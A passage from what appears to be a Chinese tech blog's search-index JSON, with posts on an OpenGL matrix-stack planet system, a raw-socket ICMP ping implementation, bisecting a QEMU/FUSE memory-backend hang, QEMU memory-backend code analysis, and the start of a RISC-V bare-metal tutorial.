矩阵堆栈实现简单行星系统","url":"/2022/03/17/OpenGL%E5%85%A5%E9%97%A8%20%E7%9F%A9%E9%98%B5%E5%A0%86%E6%A0%88%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E8%A1%8C%E6%98%9F%E7%B3%BB%E7%BB%9F/","content":"本文介绍如何使用矩阵堆栈原理实现简单的行星运行系统。\n原理有时我们需要在一个场景中绘制不同的模型，如果这些模型彼此间没有联系，即各模型的位置不会相互影响，那我们只需要单独为每个模型创建合适的变换矩阵，并经过渲染管线将其渲染即可。而对于一个位置会相互影响的系统而言，例如行星运行系统，地球围绕太阳公转，而月球围绕地球公转。处理这样问题的关键在于如何确定各物体变换矩阵，准确来说是模型-视图矩阵。而矩阵堆栈可以很好地将这问题简化。所谓矩阵堆栈，就一个用来存储变换矩阵的堆栈结构，栈顶矩阵为栈底矩阵乘上另一个矩阵变换而来，由此，栈底到栈顶形成一个逐步复杂的结构。通常来说，栈底的矩阵为视图矩阵，因为对于一个场景中的每个物体，它们都要经过视图矩阵的变换。逐步往上，由父物体的变换矩阵先入栈，利用栈顶矩阵作为该物体的模型-视图矩阵绘制物体后，再进入其子物体的管线，依次逐步进行。同时，对于不希望由父物体继承给子物体的变换矩阵可以在绘制完父物体后将其出栈。\n实现代码实现对于本文所要研究的行星运行系统，共有三个物体：太阳、地球、月球，它们的依赖关系是：地球围绕太阳公转，而月球围绕地球公转。矩阵堆栈的变换情况如下：\n\n将视图矩阵压入栈中。\nvMat = glm::translate(glm::mat4(1.0f), glm::vec3(-cameraX, -cameraY, -cameraZ));mvStack.push(vMat);\n\n构造太阳的模型矩阵，将其与栈顶矩阵相乘后。\n\n将旋转矩阵与栈顶矩阵相乘并入栈以实现太阳的自转效果，将栈顶矩阵作为太阳的模型-视图矩阵，渲染太阳后将栈顶矩阵出栈，移除太阳的旋转变换。\n/// &lt;summary&gt;/// 绘制太阳/// &lt;/summary&gt;mMat = glm::translate(glm::mat4(1.0f), glm::vec3(sunLocX, sunLocY, sunLocZ));mvStack.top() *= mMat;mvStack.push(mvStack.top());mvStack.top() *= glm::rotate(glm::mat4(1.0f), (float)currentTime, glm::vec3(0.0f, 1.0f, 0.0f)); // 太阳自转drawSphere(sunTexture);mvStack.pop(); // 矩阵堆栈中移除太阳自转\n\n将平移矩阵与栈顶矩阵相乘并入栈以实现地球的公转效果，其中平移的坐标的计算利用程序运行时间的三角函数值得到。\n\n将旋转矩阵与缩放矩阵与栈顶矩阵相乘后入栈，实现地球的自转效果并将地球的尺寸缩小，将栈顶矩阵作为地球的模型-视图矩阵，渲染地球后将栈顶矩阵出栈，移除地球的旋转和缩放变换。\n/// &lt;summary&gt;/// 绘制地球/// &lt;/summary&gt;mvStack.push(mvStack.top());mvStack.top() *= glm::translate(glm::mat4(1.0f), glm::vec3(sin((float)currentTime) * 4.0f, 0.0f, cos((float)currentTime) * 4.0f)); // 地球公转mvStack.push(mvStack.top());mvStack.top() *= glm::rotate(glm::mat4(1.0f), (float)currentTime, glm::vec3(0.0f, 1.0f, 0.0f)); // 地球自转mvStack.top() *= glm::scale(glm::mat4(1.0f), glm::vec3(0.3f, 0.3f, 0.3f)); // 地球缩放drawSphere(earthTexture);mvStack.pop(); // 矩阵堆栈中移除地球自转和缩放\n\n与地球类似，将平移矩阵与栈顶矩阵相乘并入栈以实现月球的公转效果。由于月球已经没有子物体，因此无需继续创建新的矩阵，只需要在栈顶矩阵的基础上乘以月球的自转和缩放矩阵，渲染完成后，将矩阵堆栈清空。\n/// &lt;summary&gt;/// 绘制月球/// &lt;/summary&gt;mvStack.push(mvStack.top());mvStack.top() *= glm::translate(glm::mat4(1.0f), glm::vec3(0.0f, sin((float)currentTime) * 0.8f, cos((float)currentTime) * 0.8f)); // 月球公转mvStack.top() *= glm::rotate(glm::mat4(1.0f), (float)currentTime, glm::vec3(0.0f, 0.0f, 1.0f)); // 月球自转mvStack.top() *= glm::scale(glm::mat4(1.0f), glm::vec3(0.1f, 0.1f, 0.1f)); // 月球缩放drawSphere(moonTexture);mvStack.pop(); mvStack.pop(); mvStack.pop(); // 清空矩阵堆栈\n\n\n运行效果\n项目链接本项目已上传 github 仓库，如果想要查看项目的完整代码，可以自行访问。\n项目链接\n","categories":["计算机图形学"],"tags":["矩阵","OpenGL","计算机图形学"]},{"title":"Ping命令的实现","url":"/2022/05/31/Ping%E5%91%BD%E4%BB%A4%E7%9A%84%E5%AE%9E%E7%8E%B0/","content":"Ping （Packet Internet Groper）是一种因特网包探索器，用于测试网络连接量的程序。本文将基于 Socket 编程，实现一个基本的 Ping 命令程序。\n\nICMP 报文分析ICMP 报文捕获在控制台输入 ping 202.195.147.248，对该目的主机发起请求，可以看到控制台输出了一系列统计信息：4 个数据包全部接收并且往返时间为 5 ms（较短），表明与该主机之间的连接畅通。\n\n使用 Wireshark 工具捕获 icmp 数据包，为了避免无关数据包的干扰，可以使用 filter 对数据包进行过滤，在上部栏输入 ip.src == 202.195.147.248 or ip.dst == 202.195.147.248，表明只筛选源地址或目的地址为 202.195.147.248 的数据包，最终可以得到数据包的内容。\n\nWireshark 数据包分析根据 ICMP 报文的格式进行分析: \n\nType：数据包类型，占 1 Byte，为 0x00，代表回送报文。\nCode：代码部分，占 1 Byte，为 0x00.\nChecksum：检验和，占 2 Bytes，为 0x554c.\nIdentifier(IE)：占 2 Bytes，为 0x0001.\nIdentifier(LE)：占 2 Bytes，为 0x0100.\nSequence Number(BE)：占 2 Bytes，为 0x000f.\nSequence Number(LE)：占 2 Bytes，为 0x0f00.\nData：占 32 Bytes，为6162636465666768696a6b6c6d6e6f7071727374757677616263646566676869.\n\n实现思路构造 ICMP 报文自定义数据结构 icmpHeader 表示 ICMP 报文头部，包含类型、代码、检验和、标识符和序列号。\n// ICMP 报文头struct icmpHeader &#123;\tunsigned char type; // 类型\tunsigned char code; // 代码\tunsigned short checkSum; // 检验和\tunsigned short id; // 标识符\tunsigned short sequence; // 序列号&#125;;\n填充该报文，类型为 8 表示请求报文。检验和使用特定的算法计算，关于算法的具体内容可以自行查看相关文档，在此不过多赘述。标识符使用进程 id 填充。最后在 ICMP 报文头的尾部，添加 32 字节的数据作为 ICMP 报文的数据部分。\n// 构造 ICMP 报文char sendBuf[8 + 32] = &#123; 0 &#125;;icmpHeader* pIcmp = (icmpHeader*)sendBuf;pIcmp-&gt;type = 8;pIcmp-&gt;code = 0;pIcmp-&gt;checkSum = 0;pIcmp-&gt;id = (USHORT)::GetCurrentProcessId();pIcmp-&gt;sequence = 0;// 填充数据部分memcpy(sendBuf + 8, &quot;abcdelmnopqrstuvwiammekakuactor&quot;, 32);// 计算检验和pIcmp-&gt;checkSum = computeCks((icmpHeader*)sendBuf, sizeof(sendBuf));\n发送请求报文该部分使用 Socket 编程向指定 IP 地址发送 ICMP 请求报文。需要注意的是，在创建套接字时，需要使用原始套接字，且 protocol 参数为 IPPROTO_ICMP，表明使用 ICMP 协议。SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); 报文发送成功后，接收从客户端发送的回送报文信息。\n// 初始化套接字库WORD wReq = MAKEWORD(2, 2);WSADATA wsadata;WSAStartup(wReq, &amp;wsadata);// 填充服务端地址SOCKADDR_IN serverAddr;memset(&amp;serverAddr, 0, sizeof(serverAddr));serverAddr.sin_family = AF_INET;serverAddr.sin_addr.S_un.S_addr = inet_addr(targetIP.c_str());// 创建套接字SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);\n为了得到报文往返的时间，可以在发送前和接收后使用 GetTickCount64() 获取从操作系统启动到现在所经历的的时间 start 和 end，两时间相减得到时间差。\n此外，由于 recvfrom() 在未收到报文时将会阻塞，因此可以使用 setsockopt() 设定一个接收超时时间，在超过指定时间未受到数据时返回 -1，表示接收异常。\nsetsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&amp;timeOut, sizeof(timeOut)); // 设置接收超时\n解析回送报文根据回送的 IP 数据包的指定格式对信息进行解析，IPv4 头部的 4 到 8 位为 IP 报文头部长度，第 9 个字节是 TTL 的值。\n完整代码#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;winsock.h&gt;#include&lt;thread&gt;#pragma comment(lib,&quot;ws2_32.lib&quot;)// ICMP 报文头struct icmpHeader &#123;\tunsigned char type; // 类型\tunsigned char code; // 代码\tunsigned short checkSum; // 检验和\tunsigned short id; // 标识符\tunsigned short sequence; // 序列号&#125;;// 计算检验和unsigned short computeCks(icmpHeader* picmp, int len) &#123;\tlong sum = 0;\tunsigned short* pusicmp = (unsigned short*)picmp;\twhile (len &gt; 1) &#123;\t\tsum += *(pusicmp++);\t\tif (sum &amp; 0x80000000)\t\t\tsum = (sum &amp; 0xffff) + (sum &gt;&gt; 16);\t\tlen -= 2;\t&#125;\tif (len)\t\tsum += (unsigned short)*(unsigned char*)pusicmp;\twhile (sum &gt;&gt; 16)\t\tsum = (sum &amp; 0xffff) + (sum &gt;&gt; 16);\treturn (unsigned short)~sum;&#125;int ping(const std::string&amp; targetIP) &#123;\t// 初始化套接字库\tWORD wReq = MAKEWORD(2, 2);\tWSADATA wsadata;\tWSAStartup(wReq, &amp;wsadata);\t// 填充服务端地址\tSOCKADDR_IN serverAddr;\tmemset(&amp;serverAddr, 0, sizeof(serverAddr));\tserverAddr.sin_family = AF_INET;\tserverAddr.sin_addr.S_un.S_addr = inet_addr(targetIP.c_str());\t// 创建套接字\tSOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);\t\t// 构造 ICMP 报文\tchar sendBuf[8 + 32] = &#123; 0 &#125;;\ticmpHeader* pIcmp = (icmpHeader*)sendBuf;\tpIcmp-&gt;type = 8;\tpIcmp-&gt;code = 0;\tpIcmp-&gt;checkSum = 0;\tpIcmp-&gt;id = (USHORT)::GetCurrentProcessId();\tpIcmp-&gt;sequence = 0;\t// 填充数据部分\tmemcpy(sendBuf + 8, &quot;abcdelmnopqrstuvwiammekakuactor&quot;, 32);\t// 计算检验和\tpIcmp-&gt;checkSum = computeCks((icmpHeader*)sendBuf, sizeof(sendBuf));\t\t// 发送报文\tDWORD start = GetTickCount64();\tint sendLen = sendto(s, sendBuf, sizeof(sendBuf), 0, (SOCKADDR*)&amp;serverAddr, sizeof(SOCKADDR));\tif (sendLen &lt; 0) printf(&quot;errno = %d\\n&quot;, GetLastError());\t// 接收报文\tchar recvBuf[1024];\tSOCKADDR_IN fromAddr;\tint fLen = sizeof(fromAddr);\tunsigned timeOut = 1000; // 超时时间\tsetsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&amp;timeOut, sizeof(timeOut)); // 设置接收超时\twhile (true) &#123;\t\tint len = recvfrom(s, recvBuf, 1024, 0, (SOCKADDR*)&amp;fromAddr, &amp;fLen);\t\tif (len &lt; 0) &#123;\t\t\tstd::cout &lt;&lt; &quot;请求超时&quot; &lt;&lt; std::endl;\t\t\treturn INT32_MAX;\t\t&#125;\t\telse break;\t&#125;\tDWORD end = GetTickCount64();\tDWORD timeSpan = end - start;\t// 回送报文解析\tchar ipInfo = recvBuf[0];\t// ipv4 头部的第 9 个字节为 TTL 的值\tunsigned char ttl = recvBuf[8];\tint ipHeadLen = ((char)(ipInfo &lt;&lt; 4) &gt;&gt; 4) * 4; // IP报文头部长度\ticmpHeader* icmpResp = (icmpHeader*)(recvBuf + ipHeadLen);\tif (icmpResp-&gt;type == 0) &#123; //回显应答报文\t\tprintf(&quot;来自 %s 的回复：字节=32 时间=%2dms TTL=%d\\n&quot;,\t\t\ttargetIP.c_str(), timeSpan, ttl);\t\treturn timeSpan;\t&#125;\telse &#123;\t\tprintf(&quot;请求超时。type = %d\\n&quot;, icmpResp-&gt;type);\t\treturn INT32_MAX;\t&#125;&#125;int main() &#123;\tstd::cout &lt;&lt; &quot;请输入目的IP地址：&quot;;\tstd::string IP;\tstd::cin &gt;&gt; IP;\tint maxTime = INT32_MIN, minTime = INT32_MAX, timeSum = 0, acpkgCnt = 0;\tprintf(&quot;\\n正在 Ping %s 具有 32 字节的数据:\\n&quot;, IP.c_str());\tfor (int i = 0; i &lt; 4; ++i) &#123;\t\tstd::this_thread::sleep_for(std::chrono::seconds(1));\t\tint timeSpan = ping(IP);\t\tacpkgCnt += timeSpan != INT32_MAX;\t\tmaxTime = max(maxTime, timeSpan);\t\tminTime = min(minTime, timeSpan);\t\ttimeSum += timeSpan;\t&#125;\tprintf(&quot;\\n%s 的 Ping 统计信息:\\n&quot;, IP.c_str());    printf(&quot;    数据包: 已发送 = 4，已接收 = %d，丢失 = %d (%d%% 丢失)，\\n&quot;,\t\tacpkgCnt, 4 - acpkgCnt, (4 - acpkgCnt) * 100 / 4);\tif (!acpkgCnt) return 0;    printf(&quot;往返行程的估计时间(以毫秒为单位):\\n&quot;);    printf(&quot;    最短 = %dms，最长 = %dms，平均 = %dms\\n&quot;, minTime, maxTime, timeSum / acpkgCnt);&#125;\n运行结果\n可见，本地与该目的主机的连通性较好。\n\n可见，本地与该目的主机无法连通。\n","categories":["计算机网络"],"tags":["计算机网络","Socket编程","Ping"]},{"title":"QEMU内存后端文件与FUSE兼容性问题及其定位","url":"/2025/09/23/QEMU%E5%86%85%E5%AD%98%E5%90%8E%E7%AB%AF%E6%96%87%E4%BB%B6%E4%B8%8EFUSE%E5%85%BC%E5%AE%B9%E6%80%A7%E9%97%AE%E9%A2%98%E5%8F%8A%E5%85%B6%E5%AE%9A%E4%BD%8D/","content":"最近想要将文件系统和 QEMU 模拟器结合起来做一些实验性的工作，需要使用 QEMU 内存后端文件的特性。前面的进展都很顺利，但是待准备工作都完成后，却遇到了模拟器无法启动的问题，好在最终还是解决了，接下来便一一细说。\n\n环境准备我的基本开发环境为 QEMU 6.2 版本，Linux 5.10 版本内核，面向架构为 x86_64。这部分环境的准备没有遇到什么大问题，只是需要注意我选用的版本相对较老，在使用较新的编译器编译时可能会报出警告，因此需要在编译前的 configure 阶段将 Werror 的 flag 禁用，以免在编译时将警告当作错误来对待。\n例如对于 QEMU 来说，configure 的命令为：\n$ ./configure --target-list=x86_64-softmmu --disable-docs --disable-werror\n\n这里最好也加上 --disable-docs，因为编译文档的工具链同样容易由于版本问题导致编译失败。\n\n文件系统方面，我当前的需求是需要实现一个最简的堆叠式加密文件系统，无需关注具体的加密算法是什么。一般来说，有两种方案：内核文件系统和 FUSE。\n想要实现一个堆叠式的内核文件系统，可以参考 Wrapfs，这是一个经典的堆叠式文件系统模板，可以对其进行扩展，引入需要的特性（如加密）。目前最新已经适配到了 5.xx 的内核版本。\n但是由于内核 API 接口变动快且复杂，难以学习和移植，而我的工作对性能又没有什么要求，因此便想要采用第二种方案——也就是 FUSE。有关如何基于 FUSE 实现一个堆叠式文件系统，不是本文的重点，后面有时间可以整理一下分享出来。\n模拟器启动在将需要的环境准备好后，便编写 QEMU 的启动命令：\n#!/bin/bashQEMU_DIR=/home/lordaeronesz/LWS/620-qemu/build/MEM_BKEND=&quot;-object memory-backend-file,id=pc.ram,size=512M,mem-path=mnt/mem,prealloc=on,share=on &quot;MACHINE=&quot;-machine q35,memory-backend=pc.ram &quot;$&#123;QEMU_DIR&#125;qemu-system-x86_64 \\    -cpu qemu64 \\    $&#123;MEM_BKEND&#125; $&#123;MACHINE&#125; -m 512M \\    -smp 4 \\    -kernel bzImage \\    -append &quot;root=/dev/vda ro console=ttyS0&quot; \\    -drive file=rootfs.ext4,format=raw,id=hd0,if=none \\    -device virtio-blk-pci,drive=hd0 \\    -nographic\n可以看到，我将 QEMU 模拟器的内存后端指定为 mnt 目录下的文件 mem，其中 mnt 目录即为我基于 FUSE 实现的堆叠式文件系统的挂载点。\n但是执行上述脚本，尝试运行时，却一直卡住，没有任何提示信息。而不使用内存后端文件，则能够正常启动。\n尝试更换其他的堆叠式文件系统，如 eCryptfs，发现能够正常启动，因此推测是 FUSE 的问题——可能是某些接口没有实现导致的。但是在 LLM 的帮助下，我将可能出现问题的 FUSE 接口均实现了一遍，发现问题仍旧存在。\n最终不得已改用其他版本的 QEMU 进行尝试，先是尝试了安装在我本机的 QEMU 8.2.2，发现能够正常启动。随后又陆续尝试了其他版本：7.0.0、8.0.0 等等。最终简单定位到 QEMU 版本在 7.1.0 时无法启动，在 7.2.0 时能够启动，应该是两个版本之间的某次 commit 修复了这个与 FUSE 不兼容的问题。\ncommit 定位但是 7.1.0 到 7.2.0 之间也有上千次的 commit，应该如何定位到那个关键提交呢？\n最开始我采用的是关键词搜索的方式，先将 7.1.0 到 7.2.0 之间的所有 commit 信息保存到日志文件中：\n$ git log v7.1.0..v7.2.0 &gt; output.log\n然后再 grep 该日志文件，搜索 fuse, mmap, memory-backend 等关键字。\n这种方法效率很低，而且最终也没能帮助我找到合适的提交。在 LLM 的提示下，我尝试采用一种新的方法，即二分法验证。\n二分法验证（git bisect）在进行搜索前，需要确定两个关键提交，这两个关键提交需要在一条时间线上，根据从左到右的顺序分别称之为“左端点”和“右端点”，左端点为 good 状态，右断点为 bad 状态。\n\n这里的所谓 “good” 和 “bad” 需要依场景而定，由于 git bisect 原本设计是用来查找“最早引入 bug 的提交”的，因此左端点认为是好的状态 good（如能够正常编译），右端点认为是不好的状态 bad（如无法正常编译）。\n但是我们这里是想要找出“最早修复 bug 的提交”，因此对于 good 和 bad 的定义需要转变一下：无法正常启动模拟器为 good 状态，能够正常启动模拟器为 bad 状态。\n\n使用方法很简单，首先切换到包含这两次关键提交的分支（如主分支），然后重置 bisect 状态，并开始：\n# 确保在主分支或包含这两个版本的分支上$ git checkout master# 重置 bisect 状态$ git bisect reset# 开始 bisect$ git bisect start\n然后标记左右两次关键提交：\n# 标记“好”的版本$ git bisect good refs/tags/v7.1.0# 标记“坏”的版本$ git bisect bad refs/tags/v7.2.0\n此时本地代码仓库便会自动切换到左右两端点中间的提交，将代码重新进行 configure 并编译，尝试能否成功启动模拟器：如果能，标记为 bad；如果不能，标记为 good。以此循环往复：\n# 配置 &amp; 编译$ ./configure --target-list=x86_64-softmmu ...$ make -j$(nproc)# 运行 QEMU 启动测试$ /path/to/qemu-system-x86_64 ...# 根据结果标记$ git bisect bad    # 如果能启动$ git bisect good   # 如果卡住\n最终，在经过了约 10 次（搜索约 $2^{10} = 1024$ 个 commit）的尝试后，最终定位到的 commit 为：\n$ git bisect badBisecting: 0 revisions left to test after this (roughly 0 steps)[ab1b2ba9c9e9871bb622b0f14a1b2e3f4adaa68f] update seabios source from 1.16.0 to 1.16.1\n发现该提交并没有 QEMU 代码的更新，只是将 seabios 的版本从 1.16.0 更新到了 1.16.1。\n最终尝试用新版本的 BIOS（目录为 pc-bios/bios-256k.bin）替换 QEMU 6.2 中旧版本的 BIOS 后，模拟器能够成功启动，问题解决。\n","categories":["操作系统"],"tags":["操作系统","经验","QEMU"]},{"title":"QEMU内存后端文件的用法及分析","url":"/2025/09/15/QEMU%E5%86%85%E5%AD%98%E5%90%8E%E7%AB%AF%E6%96%87%E4%BB%B6%E7%9A%84%E7%94%A8%E6%B3%95%E5%8F%8A%E5%88%86%E6%9E%90/","content":"本文将介绍 QEMU 中内存后端文件参数用法和代码实现，基于的版本为 QEMU 6.2。\n\n参数用法首先是参数的用法，下面是 官方文档 中对此的说明：\n\nmemory-backend=’id’\nAn alternative to legacy -mem-path and mem-prealloc options. Allows to use a memory backend as main RAM.\nFor example:\n-object memory-backend-file,id=pc.ram,size=512M,mem-path=/hugetlbfs,prealloc=on,share=on-machine memory-backend=pc.ram-m 512M\n\n接下来我们做一个测试，首先创建一个空文件 mem，使用 du 查看其空间占用大小：\n$ du -sh mem0       mem\n然后利用参数指定该文件为内存后端文件，并启动一个模拟器，启动参数如下：\nqemu-system-riscv64 \\    -cpu rv64 \\    -object memory-backend-file,id=pc.ram,size=512M,mem-path=mem,prealloc=on,share=on \\    -machine virt,memory-backend=pc.ram \\    -m 512M \\    -smp 4 \\    -kernel Image \\    -append &quot;rootwait root=/dev/vda ro&quot; \\    -drive file=rootfs.ext4,format=raw,id=hd0 -device virtio-blk-device,drive=hd0 \\    -nographic \\\n模拟器启动后关闭再次查看其空间占用大小：\n$ du -sh mem512M    mem\n可以看到，该文件大小已经增长为了 512M，即我们指定的模拟器内存空间大小，说明 QEMU 的确将该文件作为了内存的后端，且由于我们启动了 share=on，模拟器运行中带来的内存数据的更改将同步到内存后端文件 mem 中。\n我们还可以进行进一步的测试，首先使用 shasum 计算文件 mem 的哈希值：\n$ shasum memed1d4cf3845092b3e409acc5c3c1c75a387ed23a  mem\n然后重新启动模拟器运行，并执行一些命令，造成内存数据的更改，然后重新使用 shasum 计算文件 mem 的哈希值：\n$ shasum mem5e2d5106d36f10a81d597b99c27071ebb353fa66 mem\n可以看到，文件的哈希值发生了更改，说明文件的数据发生了变化。\n代码实现分析接下来我们具体分析 QEMU 中是如何实现这样的内存后端文件机制的。首先是函数的调用栈，从对象 mem-backend-file 的创建开始看，其调用栈如下：\n(struct UserCreatableClass).complete    -&gt; host_memory_backend_memory_complete        -&gt; (struct HostMemoryBackendClass).alloc            -&gt; file_backend_memory_alloc                -&gt; memory_region_init_ram_from_file                    -&gt; qemu_ram_alloc_from_file                        -&gt; qemu_ram_alloc_from_fd                            -&gt; file_ram_alloc                                -&gt; qemu_ram_mmap\n以下是各具体代码片段的分析：\n/* backends/hostmem.c */static voidhost_memory_backend_memory_complete(UserCreatable *uc, Error **errp)&#123;    HostMemoryBackend *backend = MEMORY_BACKEND(uc);    HostMemoryBackendClass *bc = MEMORY_BACKEND_GET_CLASS(uc);    Error *local_err = NULL;    void *ptr;    uint64_t sz;    if (bc-&gt;alloc) &#123;        /* 调用 alloc 根据内存后端的类型进行内存数据结构初始化 */        bc-&gt;alloc(backend, &amp;local_err);        if (local_err) &#123;            goto out;        &#125;        ptr = memory_region_get_ram_ptr(&amp;backend-&gt;mr);        sz = memory_region_size(&amp;backend-&gt;mr);        [...]    &#125;out:    error_propagate(errp, local_err);&#125;\n上述函数的主要作用是调用一个统一的回调函数 alloc，对各不同的内存后端（ram, file, memfd）进行分别的内存初始化。\n/* backends/hostmem-file.c */static voidfile_backend_memory_alloc(HostMemoryBackend *backend, Error **errp)&#123;    [...]    HostMemoryBackendFile *fb = MEMORY_BACKEND_FILE(backend);    uint32_t ram_flags;    gchar *name;    [...]    name = host_memory_backend_get_name(backend);    ram_flags = backend-&gt;share ? RAM_SHARED : 0;    ram_flags |= backend-&gt;reserve ? 0 : RAM_NORESERVE;    ram_flags |= fb-&gt;is_pmem ? RAM_PMEM : 0;    /* 根据文件后端文件来创建 MR */    memory_region_init_ram_from_file(&amp;backend-&gt;mr, OBJECT(backend), name,                                     backend-&gt;size, fb-&gt;align, ram_flags,                                     fb-&gt;mem_path, fb-&gt;readonly, errp);    g_free(name);    [...]&#125;\n上述函数则是针对后端为一个文件（命名文件）的情况，进行内存数据结构 memory_region 的初始化。\n/* softmmu/memory.c */void memory_region_init_ram_from_file(MemoryRegion *mr,                                      Object *owner,                                      const char *name,                                      uint64_t size,                                      uint64_t align,                                      uint32_t ram_flags,                                      const char *path,                                      bool readonly,                                      Error **errp)&#123;    Error *err = NULL;    /* 初始化 MR */    memory_region_init(mr, owner, name, size);    mr-&gt;ram = true;    mr-&gt;readonly = readonly;    mr-&gt;terminates = true;    mr-&gt;destructor = memory_region_destructor_ram;    mr-&gt;align = align;    /* MR 的 ram_block 根据内存后端文件来创建 */    mr-&gt;ram_block = qemu_ram_alloc_from_file(size, mr, ram_flags, path,                                             readonly, &amp;err);    [...]&#125;\n上述函数初始化了 memory_region 的一系列元数据属性（是否只读、对齐规则等），最后调用 qemu_ram_alloc_from_file 创建其内存块结构 ram_block。\n/* softmmu/physmem.c */RAMBlock *qemu_ram_alloc_from_file(ram_addr_t size, MemoryRegion *mr,                                   uint32_t ram_flags, const char *mem_path,                                   bool readonly, Error **errp)&#123;    int fd;    bool created;    RAMBlock *block;    /* 打开内存后端文件 */    fd = file_ram_open(mem_path, memory_region_name(mr), readonly, &amp;created,                       errp);    [...]    /* 根据内存后端文件来创建 ram_block */    block = qemu_ram_alloc_from_fd(size, mr, ram_flags, fd, 0, readonly, errp);    [...]    return block;&#125;\n上述函数则是一个进一步的封装，划分为打开文件得到文件描述符 fd 和根据 fd 进行 ram_block 的创建两步。\n/* softmmu/physmem.c */RAMBlock *qemu_ram_alloc_from_fd(ram_addr_t size, MemoryRegion *mr,                                 uint32_t ram_flags, int fd, off_t offset,                                 bool readonly, Error **errp)&#123;    RAMBlock *new_block;    Error *local_err = NULL;    int64_t file_size, file_align;    [...]        size = HOST_PAGE_ALIGN(size);    file_size = get_file_size(fd);    if (file_size &gt; 0 &amp;&amp; file_size &lt; size) &#123;        error_setg(errp, &quot;backing store size 0x%&quot; PRIx64                   &quot; does not match &#x27;size&#x27; option 0x&quot; RAM_ADDR_FMT,                   file_size, size);        return NULL;    &#125;    file_align = get_file_align(fd);    if (file_align &gt; 0 &amp;&amp; file_align &gt; mr-&gt;align) &#123;        error_setg(errp, &quot;backing store align 0x%&quot; PRIx64                   &quot; is larger than &#x27;align&#x27; option 0x%&quot; PRIx64,                   file_align, mr-&gt;align);        return NULL;    &#125;    new_block = g_malloc0(sizeof(*new_block));    new_block-&gt;mr = mr;    new_block-&gt;used_length = size;    new_block-&gt;max_length = size;    new_block-&gt;flags = ram_flags;    /* ram_block 的宿主机地址根据内存后端文件分配 */    new_block-&gt;host = file_ram_alloc(new_block, size, fd, readonly,                                     !file_size, offset, errp);    if (!new_block-&gt;host) &#123;        g_free(new_block);        return NULL;    &#125;    /* 进行 ram_block 的新增 */    ram_block_add(new_block, &amp;local_err);    if (local_err) &#123;        g_free(new_block);        error_propagate(errp, local_err);        return NULL;    &#125;    return new_block;&#125;\n上述函数根据 fd 所指向的文件属性创建 ram_block 结构，最核心的操作为调用 file_ram_alloc 分配宿主机的一片内存空间，并将该空间起始地址赋值给 host 字段，ram_block 创建完成后，插入 memory_region 中进行更新。\n/* softmmu/physmem.c */static void *file_ram_alloc(RAMBlock *block,                            ram_addr_t memory,                            int fd,                            bool readonly,                            bool truncate,                            off_t offset,                            Error **errp)&#123;    uint32_t qemu_map_flags;    void *area;    [...]    qemu_map_flags = readonly ? QEMU_MAP_READONLY : 0;    qemu_map_flags |= (block-&gt;flags &amp; RAM_SHARED) ? QEMU_MAP_SHARED : 0;    qemu_map_flags |= (block-&gt;flags &amp; RAM_PMEM) ? QEMU_MAP_SYNC : 0;    qemu_map_flags |= (block-&gt;flags &amp; RAM_NORESERVE) ? QEMU_MAP_NORESERVE : 0;    /* 宿主机内存区域根据内存后端文件 mmap 得到 */    area = qemu_ram_mmap(fd, memory, block-&gt;mr-&gt;align, qemu_map_flags, offset);    if (area == MAP_FAILED) &#123;        error_setg_errno(errp, errno,                         &quot;unable to map backing store for guest RAM&quot;);        return NULL;    &#125;    block-&gt;fd = fd;    return area;&#125;\n上述函数则是如何根据 fd 所指向的文件创建一片内存空间，可以看到，核心操作就是 mmap 文件映射。\n","categories":["操作系统"],"tags":["操作系统","QEMU"]},{"title":"RISC-V 架构下的裸金属程序","url":"/2025/07/19/RISC-V%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84%E8%A3%B8%E9%87%91%E5%B1%9E%E7%A8%8B%E5%BA%8F/","content":"本文将介绍如何在 RISC-V 环境下，编写一个最简的裸金属（bare-metal）程序，该程序不依赖于操作系统的支持，计算机在启动后直接跳转到该程序开始执行。本文的目的主要是作为一个程序模板，可以对其进行扩展成为一个完整的操作系统或是常驻内存中的固件服务。\n\n实现原理要实现计算机在启动后立马跳转到该程序执行，需要明确一点：计算机启动后执行的第一条指令是什么？或者说，PC 初始值是什么？答案根据平台的不同可能存在差异，我们的测试环境为 qemu-system-riscv64 模拟器的 virt 模型，其初始 PC 为 0x80000000。那么我们便要编写链接脚本，将需要程序的入口点链接到该地址处。\n还有第二个问题：程序入口可以直接是 C 程序吗？答案是不行，至少绝大部分情况下不行。C 代码编译之后，局部作用域内变量的保存依赖于栈，因此我们必须准备好一片连续的内存区域（栈空间），并在进入 C 环境前将栈指针寄存器（SP）指向该内存区域的最高地址处（因为栈从高地址向低地址增长）。\n至于栈空间的分配，通常有两种方式。首先可以编写链接脚本进行预留：\nOUTPUT_ARCH(&quot;riscv&quot;)ENTRY(_entry)MEMORY &#123;    RAM (rwx) : ORIGIN = 0x80000000, LENGTH = 128M&#125;SECTIONS&#123;\t...        /* 预留 4KB 栈空间 */    .stack (NOLOAD) : &#123;        . = ALIGN(16);        _stack_start = .;        . += 4K;  /* 4KB 栈空间 */        _stack_end = .;    &#125; &gt; RAM&#125;\n还有一种比较巧妙的方法：直接声明一个大小为约定的栈空间大小的数组，并在入口处将 SP 设置为该数组的起始地址。\n#define STACK_SIZE 4096char __stack[STACK_SIZE] __attribute__((aligned(16)));\n而对于全局变量（符号）的寻址，有时还会借助 GP 寄存器进行 GP 相对寻址，因此还需要在入口处对其进行设置。我们在这里不考虑，编译时采用 -mcmodel=medany，仅使用 PC 相对寻址。\n完整代码MakefileCROSS_COMPILE = riscv64-unknown-elf-CC = $(CROSS_COMPILE)gccLD = $(CROSS_COMPILE)ldOBJCOPY = $(CROSS_COMPILE)objcopyOBJDUMP = $(CROSS_COMPILE)objdumpCFLAGS = -Wall -Werror -fno-omit-frame-pointer -ggdb -gdwarf-2CFLAGS += -MD CFLAGS += -mcmodel=medanyCFLAGS += -fno-common -nostdlibCFLAGS += -fno-stack-protectorCFLAGS += -I.LDFLAGS = -T linker.ldSRCS_C := $(wildcard *.c)SRCS_S := $(wildcard *.S)OBJS := $(SRCS_C:.c=.o) $(SRCS_S:.S=.o)TARGET = firmwareBIN = $(TARGET).bin.PHONY: all cleanall: $(BIN)%.o: %.c\t$(CC) 